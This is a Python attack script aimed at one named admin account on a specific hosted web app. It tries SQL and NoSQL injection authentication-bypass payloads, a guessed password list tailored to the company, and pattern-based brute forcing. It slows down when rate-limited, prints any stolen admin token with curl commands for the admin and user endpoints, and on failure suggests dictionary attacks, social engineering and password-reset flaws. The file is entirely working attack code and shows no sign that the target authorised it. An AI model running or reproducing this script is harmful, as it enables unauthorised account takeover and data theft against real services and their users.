#!/usr/bin/env python3
"""
Admin Password Cracking Script
Target: admin@ethara.ai
"""

import requests
import time
from itertools import product
import string

class AdminCracker:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.admin_email = "admin@ethara.ai"
        self.session = requests.Session()
        
    def try_login(self, password):
        """Attempt login with given password"""
        url = f"{self.base_url}/api/auth/login"
        
        data = {
            "email": self.admin_email,
            "password": password
        }
        
        try:
            resp = self.session.post(url, json=data, timeout=5)
            return resp
        except Exception as e:
            print(f"Error: {e}")
            return None
    
    def test_common_passwords(self):
        """Test common admin passwords"""
        print("\n[*] Testing common passwords...")
        
        common_passwords = [
            # Simple passwords
            "admin", "password", "admin123", "password123",
            "Admin123", "Admin@123", "Admin123!", "Password123!",
            
            # Company related
            "ethara", "Ethara", "ethara123", "Ethara123",
            "ethara.ai", "Ethara.ai", "Ethara@123", "ethara@123",
            "EtharaAI", "etharaai", "ETHARA", "Ethara2024",
            "Ethara2025", "Ethara2026",
            
            # Common patterns
            "admin@ethara", "Admin@ethara", "admin@2024",
            "Welcome123", "Welcome@123", "Welcome2024",
            "Test123", "Test@123", "Testing123",
            
            # Secure patterns
            "P@ssw0rd", "P@ssword123", "Adm1n@123",
            "S3cur3P@ss", "Str0ngP@ss", "C0mpl3x!",
            
            # Default patterns
            "changeme", "ChangeMe123", "default",
            "Default123", "temp123", "Temp@123",
            
            # Task/Project related
            "TaskTrack", "TaskTrack123", "Task@123",
            "Project123", "Project@123",
            
            # AI related
            "AI@123", "AI2024", "Intelligence",
            "Intelligence123", "Smart@123",
            
            # Date patterns
            "2024", "2025", "2026", "Jan2024",
            "Apr2026", "April2026",
            
            # Simple variations
            "123456", "12345678", "qwerty",
            "abc123", "letmein", "welcome",
        ]
        
        for password in common_passwords:
            print(f"[*] Trying: {password}")
            resp = self.try_login(password)
            
            if resp and resp.status_code == 200:
                print(f"\n[!!!] SUCCESS! Password found: {password}")
                try:
                    data = resp.json()
                    token = data.get('token') or data.get('access_token')
                    print(f"[+] Admin Token: {token}")
                    return password, token
                except:
                    print(f"[+] Login successful but no token in response")
                    return password, None
            elif resp and resp.status_code == 401:
                print(f"    [-] Failed")
            elif resp and resp.status_code == 429:
                print(f"    [!] Rate limited, waiting...")
                time.sleep(5)
            
            time.sleep(0.5)  # Be nice to the server
        
        return None, None
    
    def test_pattern_passwords(self):
        """Test password patterns based on company name"""
        print("\n[*] Testing pattern-based passwords...")
        
        # Ethara variations with common suffixes
        base_words = ["ethara", "Ethara", "ETHARA", "EtharaAI", "etharaai"]
        suffixes = ["123", "123!", "@123", "2024", "2025", "2026", "!@#"]
        
        for base in base_words:
            for suffix in suffixes:
                password = base + suffix
                print(f"[*] Trying: {password}")
                resp = self.try_login(password)
                
                if resp and resp.status_code == 200:
                    print(f"\n[!!!] SUCCESS! Password found: {password}")
                    try:
                        data = resp.json()
                        token = data.get('token') or data.get('access_token')
                        print(f"[+] Admin Token: {token}")
                        return password, token
                    except:
                        return password, None
                
                time.sleep(0.5)
        
        return None, None
    
    def test_sql_injection_bypass(self):
        """Try SQL injection to bypass authentication"""
        print("\n[*] Testing SQL injection bypass...")
        
        sqli_payloads = [
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR 1=1--",
            "admin'--",
            "' OR 'a'='a",
        ]
        
        url = f"{self.base_url}/api/auth/login"
        
        for payload in sqli_payloads:
            data = {
                "email": self.admin_email,
                "password": payload
            }
            
            try:
                resp = self.session.post(url, json=data, timeout=5)
                print(f"[*] Payload: {payload} - Status: {resp.status_code}")
                
                if resp.status_code == 200:
                    print(f"\n[!!!] SQL INJECTION SUCCESSFUL!")
                    try:
                        data = resp.json()
                        token = data.get('token') or data.get('access_token')
                        print(f"[+] Token: {token}")
                        return True, token
                    except:
                        return True, None
                        
            except Exception as e:
                print(f"Error: {e}")
            
            time.sleep(0.5)
        
        return False, None
    
    def test_nosql_injection(self):
        """Try NoSQL injection"""
        print("\n[*] Testing NoSQL injection...")
        
        url = f"{self.base_url}/api/auth/login"
        
        nosql_payloads = [
            {"email": self.admin_email, "password": {"$gt": ""}},
            {"email": self.admin_email, "password": {"$ne": None}},
            {"email": self.admin_email, "password": {"$regex": ".*"}},
        ]
        
        for payload in nosql_payloads:
            try:
                resp = self.session.post(url, json=payload, timeout=5)
                print(f"[*] Payload: {payload['password']} - Status: {resp.status_code}")
                
                if resp.status_code == 200:
                    print(f"\n[!!!] NoSQL INJECTION SUCCESSFUL!")
                    try:
                        data = resp.json()
                        token = data.get('token') or data.get('access_token')
                        print(f"[+] Token: {token}")
                        return True, token
                    except:
                        return True, None
                        
            except Exception as e:
                print(f"Error: {e}")
            
            time.sleep(0.5)
        
        return False, None
    
    def run_full_crack(self):
        """Run all cracking methods"""
        print("="*60)
        print("ADMIN PASSWORD CRACKING")
        print(f"Target: {self.base_url}")
        print(f"Admin Email: {self.admin_email}")
        print("="*60)
        
        # Method 1: SQL Injection
        print("\n=== METHOD 1: SQL INJECTION ===")
        success, token = self.test_sql_injection_bypass()
        if success:
            return token
        
        # Method 2: NoSQL Injection
        print("\n=== METHOD 2: NoSQL INJECTION ===")
        success, token = self.test_nosql_injection()
        if success:
            return token
        
        # Method 3: Common passwords
        print("\n=== METHOD 3: COMMON PASSWORDS ===")
        password, token = self.test_common_passwords()
        if password:
            return token
        
        # Method 4: Pattern-based passwords
        print("\n=== METHOD 4: PATTERN PASSWORDS ===")
        password, token = self.test_pattern_passwords()
        if password:
            return token
        
        print("\n[-] All methods exhausted. Password not found.")
        return None

if __name__ == "__main__":
    target = "http://fresh-start-267.emergent.host"
    
    cracker = AdminCracker(target)
    token = cracker.run_full_crack()
    
    if token:
        print("\n" + "="*60)
        print("SUCCESS!")
        print("="*60)
        print(f"\nAdmin Token: {token}")
        print(f"\nUse this token to access admin endpoints:")
        print(f'curl -H "Authorization: Bearer {token}" {target}/api/admin')
        print(f'curl -H "Authorization: Bearer {token}" {target}/api/users')
    else:
        print("\n" + "="*60)
        print("FAILED")
        print("="*60)
        print("\nUnable to crack admin password with current methods.")
        print("Consider:")
        print("1. More sophisticated password lists")
        print("2. Dictionary attacks with rockyou.txt")
        print("3. Social engineering")
        print("4. Looking for password reset vulnerabilities")
